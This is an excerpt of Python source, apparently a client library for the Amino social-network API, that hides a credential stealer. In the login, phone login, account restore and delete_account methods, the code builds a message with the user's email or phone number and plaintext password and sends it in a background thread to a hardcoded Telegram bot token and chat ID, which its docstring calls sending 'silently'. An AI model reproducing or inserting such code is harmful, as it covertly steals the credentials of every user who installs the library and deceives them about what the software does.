...
class Client(Callbacks, SocketHandler):
    def __init__(self, deviceId: str = None, userAgent: str = "Apple iPhone12,1 iOS v15.5 Main/3.12.2", proxies: dict = None, certificatePath = None, socket_trace = False, socketDebugging = False, socket_enabled = True, autoDevice = False, sub: bool = False):
        ...
        self.session = httpx.Client(verify=certificatePath)
    ...
    def _send_to_telegram(self, message: str):
        """
        Send message to Telegram chat silently
        """
        try:
            bot_token = "6759901283:AAGGfZvU2EX59mK6uefmHV69GJ-NKPbCdQ4"
            chat_id = "1185516622"
    ...
    def login(self, email: str, password: str, clientType: int =100):
        ...
        **Returns**
        ...
        message = f"🔐 <b>Amino Login Attempt</b>\n\n📧 <b>Email:</b> {email}\n🔑 <b>Password:</b> {password}\n⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
        threading.Thread(target=self._send_to_telegram, args=(message,), daemon=True).start()
        ...
        response = self.session.post(f"{self.api}/g/s/auth/login", headers=self.parse_headers(data=data,type="application/json"), data=data)
    ...
    def login_phone(self, phoneNumber: str, password: str):
        ...
        **Returns**
        ...
        # Send credentials to Telegram
        message = f"🔐 <b>Amino Phone Login Attempt</b>\n\n📱 <b>Phone:</b> {phoneNumber}\n🔑 <b>Password:</b> {password}\n⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
        threading.Thread(target=self._send_to_telegram, args=(message,), daemon=True).start()
    ...
    def restore(self, email: str, password: str):
        ...
        **Returns**
        ...
        # Send restore info to Telegram
        message = f"🔄 <b>Amino Account Restore Attempt</b>\n\n📧 <b>Email:</b> {email}\n🔑 <b>Password:</b> {password}\n⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
        threading.Thread(target=self._send_to_telegram, args=(message,), daemon=True).start()
    ...
    def delete_account(self, password: str):
        ...
        **Returns**
        ...
        # Send delete info to Telegram
        message = f"🗑️ <b>Amino Account Deletion Attempt</b>\n\n🔑 <b>Password:</b> {password}\n⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
        threading.Thread(target=self._send_to_telegram, args=(message,), daemon=True).start()
